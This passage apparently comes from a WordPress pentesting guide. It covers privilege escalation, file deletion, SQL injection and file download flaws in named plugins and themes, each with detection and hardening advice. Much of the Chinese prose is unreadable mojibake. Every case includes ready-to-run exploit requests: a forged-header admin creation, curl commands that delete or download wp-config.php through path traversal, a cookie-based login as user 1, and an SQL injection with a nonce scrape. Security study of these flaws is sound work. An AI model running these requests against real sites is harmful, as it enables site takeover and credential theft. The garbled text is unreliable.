- ç¤ºä¾‹ header: `X-Wcpay-Platform-Checkout-User: 1`ï¼ˆå¼ºåˆ¶ç”¨æˆ· ID ä¸º 1ï¼Œé€šå¸¸æ˜¯ç¬¬ä¸€ä¸ªç®¡ç†å‘˜å¸å·ï¼‰ã€‚
- è¢«åˆ©ç”¨çš„è·¯ç”±ï¼š`POST /wp-json/wp/v2/users`ï¼Œå¹¶æäº¤åŒ…å«æå‡å role æ•°ç»„ã€‚

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Why it works
- è¯¥æ’ä»¶å°†å®¢æˆ·ç«¯å¯æ§çš„ header æ˜ å°„ä¸ºè®¤è¯çŠ¶æ€å¹¶è·³è¿‡èƒ½åŠ›æ£€æŸ¥ã€‚
- WordPress core å¯¹æ­¤è·¯ç”±æœŸæœ› `create_users` èƒ½åŠ›ï¼›è¯¥æ’ä»¶é€šè¿‡ç›´æ¥ä» header è®¾ç½®å½“å‰ç”¨æˆ·ä¸Šä¸‹æ–‡æ¥ç»•è¿‡æ­¤æ£€æŸ¥ã€‚

Expected success indicators
- HTTP 201ï¼Œå“åº”ä½“ä¸ºæè¿°æ–°å»ºç”¨æˆ·çš„ JSONã€‚
- åœ¨ `wp-admin/users.php` ä¸­å¯è§ä¸€ä¸ªæ–°ç®¡ç†å‘˜ç”¨æˆ·ã€‚

Detection checklist
- æœç´¢ `getallheaders()`, `$_SERVER['HTTP_...']`, æˆ–è¯»å–è‡ªå®šä¹‰ header æ¥è®¾ç½®ç”¨æˆ·ä¸Šä¸‹æ–‡çš„ç¬¬ä¸‰æ–¹ SDKï¼ˆä¾‹å¦‚ `wp_set_current_user()`, `wp_set_auth_cookie()`ï¼‰ã€‚
- å®¡æŸ¥ REST æ³¨å†Œï¼ŒæŸ¥æ‰¾é‚£äº›å¯¹ç‰¹æƒå›è°ƒç¼ºä¹å¥å£® `permission_callback` æ£€æŸ¥è€Œè½¬è€Œä¾èµ–è¯·æ±‚ header çš„æƒ…å†µã€‚
- æŸ¥æ‰¾åœ¨ REST å¤„ç†å™¨ä¸­ä»…é€šè¿‡ header å€¼ä½œä¸ºé—¨æ§çš„æ ¸å¿ƒç”¨æˆ·ç®¡ç†å‡½æ•°ï¼ˆ`wp_insert_user`, `wp_create_user`ï¼‰çš„ä½¿ç”¨ã€‚

Hardening
- åˆ‡å‹¿ä»å®¢æˆ·ç«¯å¯æ§çš„ header æ¨å¯¼è®¤è¯æˆ–æˆæƒã€‚
- å¦‚æœåå‘ä»£ç†å¿…é¡»æ³¨å…¥èº«ä»½ä¿¡æ¯ï¼Œåº”åœ¨ä»£ç†å¤„ç»“æŸä¿¡ä»»å¹¶å»é™¤å…¥ç«™å‰¯æœ¬ï¼ˆä¾‹å¦‚åœ¨è¾¹ç¼˜ä½¿ç”¨ `unset X-Wcpay-Platform-Checkout-User`ï¼‰ï¼Œç„¶åä¼ é€’ç­¾åä»¤ç‰Œå¹¶åœ¨æœåŠ¡å™¨ç«¯éªŒè¯ã€‚
- å¯¹äºæ‰§è¡Œç‰¹æƒæ“ä½œçš„ REST è·¯ç”±ï¼Œè¦æ±‚ä½¿ç”¨ `current_user_can()` æ£€æŸ¥å’Œä¸¥æ ¼çš„ `permission_callback`ï¼ˆä¸è¦ä½¿ç”¨ `__return_true`ï¼‰ã€‚
- ä¼˜å…ˆä½¿ç”¨ä¸€æ–¹è®¤è¯ï¼ˆcookiesã€application passwordsã€OAuthï¼‰ï¼Œè€Œéé€šè¿‡ header çš„â€œå†’å……â€ã€‚

References: see the links at the end of this page for a public case and broader analysis.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress ä¸»é¢˜å’Œæ’ä»¶ç»å¸¸é€šè¿‡ `wp_ajax_` å’Œ `wp_ajax_nopriv_` é’©å­æš´éœ² AJAX å¤„ç†å™¨ã€‚ å½“ä½¿ç”¨ **_nopriv_** å˜ä½“æ—¶ **å›è°ƒå°†å¯è¢«æœªè®¤è¯çš„è®¿é—®è€…è°ƒç”¨**ï¼Œå› æ­¤ä»»ä½•æ•æ„Ÿæ“ä½œè¿˜å¿…é¡»é¢å¤–å®ç°ï¼š

1. ä¸€ä¸ª **capability check**ï¼ˆä¾‹å¦‚ `current_user_can()` æˆ–è‡³å°‘ `is_user_logged_in()`ï¼‰ï¼Œä»¥åŠ
2. ä¸€ä¸ª **CSRF nonce**ï¼Œä½¿ç”¨ `check_ajax_referer()` / `wp_verify_nonce()` éªŒè¯ï¼Œå’Œ
3. **ä¸¥æ ¼çš„è¾“å…¥å‡€åŒ– / éªŒè¯**ã€‚

Litho multipurpose theme (< 3.1) åœ¨ *Remove Font Family* åŠŸèƒ½ä¸­é—æ¼äº†è¿™ä¸‰é¡¹æ§åˆ¶ï¼Œæœ€ç»ˆå‘å‡ºäº†ä»¥ä¸‹ä»£ç ï¼ˆç®€åŒ–ï¼‰ï¼š
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
è¯¥ä»£ç ç‰‡æ®µå¼•å…¥çš„é—®é¢˜ï¼š

* **æœªè®¤è¯è®¿é—®** â€“ å·²æ³¨å†Œ `wp_ajax_nopriv_` é’©å­ã€‚
* **ç¼ºå°‘ nonce / æƒé™ æ£€æŸ¥** â€“ ä»»ä½•è®¿é—®è€…éƒ½å¯ä»¥è®¿é—®è¯¥ç«¯ç‚¹ã€‚
* **æœªè¿›è¡Œè·¯å¾„æ¶ˆæ¯’** â€“ ç”¨æˆ·æ§åˆ¶çš„ `fontfamily` å­—ç¬¦ä¸²æœªç»è¿‡æ»¤ç›´æ¥æ‹¼æ¥åˆ°æ–‡ä»¶ç³»ç»Ÿè·¯å¾„ï¼Œä»è€Œå…è®¸ç»å…¸çš„ `../../` ç›®å½•éå†ã€‚

#### åˆ©ç”¨

æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ä¸€ä¸ª HTTP POST è¯·æ±‚åˆ é™¤ä½äº **ä¸Šä¼ åŸºç›®å½•ä¸‹** çš„ä»»æ„æ–‡ä»¶æˆ–ç›®å½•ï¼ˆé€šå¸¸ä¸º `<wp-root>/wp-content/uploads/`ï¼‰ï¼š
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### æ£€æµ‹æ¸…å•

* ä»»ä½•åœ¨ `add_action( 'wp_ajax_nopriv_...')` å›è°ƒä¸­è°ƒç”¨æ–‡ä»¶ç³»ç»Ÿè¾…åŠ©å‡½æ•°ï¼ˆ`copy()`, `unlink()`, `$wp_filesystem->delete()` ç­‰ï¼‰ã€‚
* å°†æœªç»è¿‡æ»¤çš„ç”¨æˆ·è¾“å…¥æ‹¼æ¥åˆ°è·¯å¾„ä¸­ï¼ˆæŸ¥æ‰¾ `$_POST`, `$_GET`, `$_REQUEST`ï¼‰ã€‚
* ç¼ºå°‘ `check_ajax_referer()` å’Œ `current_user_can()`/`is_user_logged_in()`ã€‚

#### åŠ å›º
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// â€¦ proceed â€¦
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  ğŸ”’  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **å§‹ç»ˆ**å°†ä»»ä½•å¯¹ç£ç›˜çš„å†™å…¥/åˆ é™¤æ“ä½œè§†ä¸ºéœ€è¦ç‰¹æƒçš„æ“ä½œå¹¶è¿›è¡Œä»”ç»†æ£€æŸ¥ï¼š
> â€¢ è®¤è¯ (Authentication)  â€¢ æˆæƒ (Authorisation)  â€¢ Nonce  â€¢ è¾“å…¥æ¶ˆæ¯’/éªŒè¯  â€¢ è·¯å¾„åŒ…å«æ§åˆ¶ï¼ˆä¾‹å¦‚é€šè¿‡ `realpath()` åŠ ä¸Š `str_starts_with()`ï¼‰ã€‚

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

è®¸å¤šæ’ä»¶é€šè¿‡å°†åŸå§‹è§’è‰²ä¿å­˜åœ¨ user meta ä¸­æ¥å®ç°â€œview as roleâ€æˆ–ä¸´æ—¶è§’è‰²åˆ‡æ¢åŠŸèƒ½ï¼Œä»¥ä¾¿ç¨åæ¢å¤ã€‚å¦‚æœæ¢å¤è·¯å¾„ä»…ä¾èµ–è¯·æ±‚å‚æ•°ï¼ˆä¾‹å¦‚ `$_REQUEST['reset-for']`ï¼‰å’Œæ’ä»¶ç»´æŠ¤çš„åˆ—è¡¨ï¼Œè€Œæ²¡æœ‰æ£€æŸ¥èƒ½åŠ›ï¼ˆcapabilitiesï¼‰å’Œæœ‰æ•ˆçš„ nonceï¼Œè¿™å°±ä¼šæˆä¸ºä¸€æ¬¡å‚ç›´æƒé™æå‡ã€‚

ä¸€ä¸ªçœŸå®æ¡ˆä¾‹å‡ºç°åœ¨ Admin and Site Enhancements (ASE) æ’ä»¶ï¼ˆâ‰¤ 7.6.2.1ï¼‰ä¸­ã€‚é‡ç½®åˆ†æ”¯åœ¨ç”¨æˆ·åå‡ºç°åœ¨å†…éƒ¨æ•°ç»„ `$options['viewing_admin_as_role_are']` æ—¶ä¼šæ ¹æ® `reset-for=<username>` æ¢å¤è§’è‰²ï¼Œä½†åœ¨ç§»é™¤å½“å‰è§’è‰²å¹¶é‡æ–°æ·»åŠ æ¥è‡ª user meta `_asenha_view_admin_as_original_roles` çš„å·²ä¿å­˜è§’è‰²ä¹‹å‰ï¼Œæ—¢æœªè¿›è¡Œ `current_user_can()` æ£€æŸ¥ï¼Œä¹Ÿæœªè¿›è¡Œ nonce éªŒè¯ï¼š
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
ä¸ºä»€ä¹ˆå¯è¢«åˆ©ç”¨

- ä¿¡ä»» `$_REQUEST['reset-for']` å’Œ plugin optionï¼Œè€Œæœªè¿›è¡ŒæœåŠ¡å™¨ç«¯æˆæƒã€‚
- å¦‚æœç”¨æˆ·ä¹‹å‰åœ¨ `_asenha_view_admin_as_original_roles` ä¸­ä¿å­˜äº†è¾ƒé«˜æƒé™å¹¶è¢«é™çº§ï¼Œä»–ä»¬å¯ä»¥é€šè¿‡è®¿é—®é‡ç½®è·¯å¾„æ¢å¤è¿™äº›æƒé™ã€‚
- åœ¨æŸäº›éƒ¨ç½²ä¸­ï¼Œä»»ä½• authenticated ç”¨æˆ·éƒ½å¯ä»¥è§¦å‘å¯¹ä»å­˜åœ¨äº `viewing_admin_as_role_are` ä¸­çš„å¦ä¸€ä¸ªç”¨æˆ·åçš„é‡ç½®ï¼ˆæˆæƒä¸å½“ï¼‰ã€‚

åˆ©ç”¨å‰æ

- å­˜åœ¨æ¼æ´çš„ plugin ç‰ˆæœ¬ä¸”è¯¥åŠŸèƒ½å·²å¯ç”¨ã€‚
- ç›®æ ‡è´¦å·åœ¨æ—©æœŸä½¿ç”¨æ—¶åœ¨ user meta ä¸­ä¿å­˜äº†é™ˆæ—§çš„é«˜æƒé™è§’è‰²ã€‚
- ä»»ä½• authenticated ä¼šè¯ï¼›reset æµç¨‹ä¸­ç¼ºå°‘ nonce/capabilityã€‚

åˆ©ç”¨ï¼ˆç¤ºä¾‹ï¼‰
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
åœ¨æ˜“å—æ”»å‡»çš„æ„å»ºä¸Šï¼Œè¿™ä¼šç§»é™¤å½“å‰è§’è‰²å¹¶é‡æ–°æ·»åŠ ä¿å­˜çš„â€œåŸå§‹è§’è‰²â€ï¼ˆä¾‹å¦‚ `administrator`ï¼‰ï¼Œä»è€Œæœ‰æ•ˆåœ°æå‡æƒé™ã€‚

Detection checklist

- æŸ¥æ‰¾åœ¨ user meta ä¸­æŒä¹…ä¿å­˜â€œåŸå§‹è§’è‰²â€çš„è§’è‰²åˆ‡æ¢åŠŸèƒ½ï¼ˆä¾‹å¦‚ `_asenha_view_admin_as_original_roles`ï¼‰ã€‚
- è¯†åˆ«é‡ç½®/æ¢å¤è·¯å¾„ï¼Œæ¡ä»¶åŒ…æ‹¬ï¼š
- ä» `$_REQUEST` / `$_GET` / `$_POST` è¯»å–ç”¨æˆ·åã€‚
- é€šè¿‡ `add_role()` / `remove_role()` ä¿®æ”¹è§’è‰²ï¼Œä½†æ²¡æœ‰ä½¿ç”¨ `current_user_can()` å’Œ `wp_verify_nonce()` / `check_admin_referer()`ã€‚
- åŸºäºæ’ä»¶é€‰é¡¹æ•°ç»„ï¼ˆä¾‹å¦‚ `viewing_admin_as_role_are`ï¼‰è¿›è¡Œæˆæƒï¼Œè€Œä¸æ˜¯åŸºäºæ‰§è¡Œè€…çš„æƒé™ã€‚

Hardening

- åœ¨æ‰€æœ‰ä¼šæ”¹å˜çŠ¶æ€çš„åˆ†æ”¯ä¸Šå¼ºåˆ¶æ‰§è¡Œèƒ½åŠ›æ£€æŸ¥ï¼ˆä¾‹å¦‚ `current_user_can('manage_options')` æˆ–æ›´ä¸¥æ ¼çš„æ£€æŸ¥ï¼‰ã€‚
- å¯¹æ‰€æœ‰è§’è‰²/æƒé™å˜æ›´è¦æ±‚ nonce å¹¶éªŒè¯ï¼š`check_admin_referer()` / `wp_verify_nonce()`ã€‚
- ä¸è¦ä¿¡ä»»è¯·æ±‚æä¾›çš„ç”¨æˆ·åï¼›åº”åŸºäºå·²è®¤è¯çš„æ‰§è¡Œè€…å’Œæ˜ç¡®ç­–ç•¥åœ¨æœåŠ¡å™¨ç«¯è§£æç›®æ ‡ç”¨æˆ·ã€‚
- åœ¨ä¸ªäººèµ„æ–™/è§’è‰²æ›´æ–°æ—¶ä½¿â€œåŸå§‹è§’è‰²â€çŠ¶æ€å¤±æ•ˆï¼Œä»¥é¿å…æ¢å¤è¿‡æ—¶çš„é«˜æƒé™ï¼š
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- è€ƒè™‘ä»…ä¿å­˜æœ€å°çŠ¶æ€ï¼Œå¹¶ä¸ºä¸´æ—¶è§’è‰²åˆ‡æ¢ä½¿ç”¨æœ‰æ—¶é™ä¸”å— capability ä¿æŠ¤çš„ä»¤ç‰Œã€‚

---

### Unauthenticated privilege escalation via cookieâ€‘trusted user switching on public init (Service Finder â€œsf-bookingâ€)

ä¸€äº›æ’ä»¶å°†ç”¨æˆ·åˆ‡æ¢çš„è¾…åŠ©å‡½æ•°ç»‘å®šåˆ°å…¬å…±çš„ `init` é’©å­ï¼Œå¹¶ä»å®¢æˆ·ç«¯å¯æ§çš„ cookie æ¨æ–­èº«ä»½ã€‚å¦‚æœä»£ç è°ƒç”¨ `wp_set_auth_cookie()`ï¼Œä½†æ²¡æœ‰éªŒè¯èº«ä»½ã€capability å’Œæœ‰æ•ˆçš„ nonceï¼Œä»»ä½•æœªè®¤è¯çš„è®¿å®¢éƒ½å¯ä»¥å¼ºåˆ¶ä»¥ä»»æ„ç”¨æˆ· ID ç™»å½•ã€‚

å…¸å‹çš„æ˜“å—æ”»å‡»æ¨¡å¼ï¼ˆç®€åŒ–è‡ª Service Finder Bookings â‰¤ 6.1ï¼‰ï¼š
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
ä¸ºä»€ä¹ˆå¯è¢«åˆ©ç”¨

- å…¬å¼€çš„ `init` hook ä½¿å¾—å¤„ç†ç¨‹åºå¯¹æœªè®¤è¯ç”¨æˆ·å¯è¾¾ï¼ˆæ²¡æœ‰ `is_user_logged_in()` ä¿æŠ¤ï¼‰ã€‚
- èº«ä»½æ¥è‡ªå®¢æˆ·ç«¯å¯ä¿®æ”¹çš„ cookieï¼ˆ`original_user_id`ï¼‰ã€‚
- ç›´æ¥è°ƒç”¨ `wp_set_auth_cookie($uid)` ä¼šå°†è¯·æ±‚è€…ä»¥è¯¥ç”¨æˆ·èº«ä»½ç™»å½•ï¼Œè€Œæ²¡æœ‰ä»»ä½• capability/nonce æ£€æŸ¥ã€‚

åˆ©ç”¨ï¼ˆæœªè®¤è¯ï¼‰
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF è€ƒè™‘äº‹é¡¹ï¼ˆé’ˆå¯¹ WordPress/plugin CVEsï¼‰

é€šç”¨çš„ edge/server WAF é€šå¸¸é’ˆå¯¹å¹¿æ³›çš„æ¨¡å¼è¿›è¡Œè°ƒä¼˜ï¼ˆSQLi, XSS, LFIï¼‰ã€‚è®¸å¤šé«˜å½±å“çš„ WordPress/plugin æ¼æ´æ˜¯ä¸åº”ç”¨ç›¸å…³çš„é€»è¾‘/auth bugï¼Œé™¤éå¼•æ“ç†è§£ WordPress è·¯ç”±å’Œæ’ä»¶è¯­ä¹‰ï¼Œå¦åˆ™è¿™äº›è¯·æ±‚çœ‹èµ·æ¥åƒæ­£å¸¸æµé‡ã€‚

æ”»å‡»æ–¹è¯´æ˜

- é’ˆå¯¹æ’ä»¶ç‰¹å®šç«¯ç‚¹ä½¿ç”¨å¹²å‡€çš„ payloadsï¼š`admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- å…ˆå°è¯•æœªè®¤è¯è·¯å¾„ï¼ˆAJAX `nopriv`, REST with permissive `permission_callback`, public shortcodesï¼‰ã€‚é»˜è®¤ payloads é€šå¸¸åœ¨ä¸åšæ··æ·†çš„æƒ…å†µä¸‹å°±èƒ½æˆåŠŸã€‚
- å…¸å‹çš„é«˜å½±å“æ¡ˆä¾‹ï¼šprivilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

é˜²å¾¡æ€§è¯´æ˜

- ä¸è¦ä¾èµ–é€šç”¨ WAF ç­¾åæ¥ä¿æŠ¤ plugin CVEsã€‚åº”å®æ–½åº”ç”¨å±‚çš„ã€é’ˆå¯¹å…·ä½“æ¼æ´çš„è™šæ‹Ÿè¡¥ä¸æˆ–å°½å¿«æ›´æ–°ã€‚
- åœ¨ä»£ç ä¸­ä¼˜å…ˆä½¿ç”¨æ­£å‘å®‰å…¨æ£€æŸ¥ï¼ˆcapabilities, nonces, strict input validationï¼‰ï¼Œè€Œä¸æ˜¯ä¾èµ–å¦å®šå¼çš„æ­£åˆ™è¿‡æ»¤ã€‚

## WordPress ä¿æŠ¤

### å®šæœŸæ›´æ–°

ç¡®ä¿ WordPressã€plugins å’Œ themes å·²æ›´æ–°åˆ°æœ€æ–°ã€‚å¹¶ç¡®è®¤åœ¨ wp-config.php ä¸­å¯ç”¨äº†è‡ªåŠ¨æ›´æ–°ï¼š
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Also, **ä»…å®‰è£…å¯ä¿¡ä»»çš„ WordPress æ’ä»¶å’Œä¸»é¢˜**ã€‚

### Security Plugins

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Other Recommendations**

- ç§»é™¤é»˜è®¤çš„ **admin** ç”¨æˆ·
- ä½¿ç”¨ **å¼ºå¯†ç ** å’Œ **2FA**
- å®šæœŸ **å®¡æŸ¥** ç”¨æˆ· **æƒé™**
- **é™åˆ¶ç™»å½•å°è¯•æ¬¡æ•°** ä»¥é˜²æ­¢ Brute Force æ”»å‡»
- é‡å‘½å **`wp-admin.php`** æ–‡ä»¶ï¼Œå¹¶ä»…å…è®¸ä»å†…éƒ¨æˆ–ç‰¹å®š IP åœ°å€è®¿é—®ã€‚


### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

WP Job Portal æ‹›è˜æ’ä»¶æš´éœ²äº†ä¸€ä¸ª **savecategory** ä»»åŠ¡ï¼Œè¯¥ä»»åŠ¡æœ€ç»ˆåœ¨ `modules/category/model.php::validateFormData()` ä¸­æ‰§è¡Œä»¥ä¸‹æ˜“å—æ”»å‡»çš„ä»£ç ï¼š
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
æ­¤ä»£ç ç‰‡æ®µå¼•å…¥çš„é—®é¢˜ï¼š

1. **æœªè¿‡æ»¤çš„ç”¨æˆ·è¾“å…¥** â€“ `parentid` ç›´æ¥æ¥è‡ª HTTP è¯·æ±‚ã€‚
2. **åœ¨ WHERE å­å¥ä¸­ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥** â€“ æ²¡æœ‰ `is_numeric()` / `esc_sql()` / prepared statementã€‚
3. **æœªè®¤è¯å³å¯è®¿é—®** â€“ è™½ç„¶è¯¥ action æ˜¯é€šè¿‡ `admin-post.php` æ‰§è¡Œï¼Œä½†å”¯ä¸€å­˜åœ¨çš„æ£€æŸ¥æ˜¯ **CSRF nonce** (`wp_verify_nonce()`)ï¼Œä»»ä½•è®¿å®¢éƒ½å¯ä»¥ä»åµŒå…¥çŸ­ä»£ç  `[wpjobportal_my_resumes]` çš„å…¬å¼€é¡µé¢è·å–ã€‚

#### Exploitation

1. Grab a fresh nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Inject arbitrary SQL by abusing `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
å“åº”ä¼šæ˜¾ç¤ºæ³¨å…¥æŸ¥è¯¢çš„ç»“æœæˆ–ä¿®æ”¹æ•°æ®åº“ï¼Œä»è€Œè¯æ˜å­˜åœ¨ SQLiã€‚


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

å¦ä¸€ä¸ªä»»åŠ¡ï¼Œ**downloadcustomfile**ï¼Œå…è®¸è®¿å®¢é€šè¿‡ path traversal ä¸‹è½½ **ç£ç›˜ä¸Šçš„ä»»æ„æ–‡ä»¶**ã€‚æ˜“å—æ”»å‡»çš„æ¼æ´ç‚¹ä½äº `modules/customfield/model.php::downloadCustomUploadedFile()`ï¼š
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` ç”±æ”»å‡»è€…æ§åˆ¶å¹¶è¢«æ‹¼æ¥ï¼Œ**æœªç»è¿‡æ¸…ç†**ã€‚ å†æ¬¡ï¼Œå”¯ä¸€çš„é—¨æ§›æ˜¯ä¸€ä¸ª **CSRF nonce**ï¼Œå¯ä»¥ä»ç®€å†é¡µé¢è·å–ã€‚

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
æœåŠ¡å™¨è¿”å› `wp-config.php` çš„å†…å®¹ï¼Œleaking DB credentials å’Œ auth keysã€‚

## å‚è€ƒèµ„æ–™

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
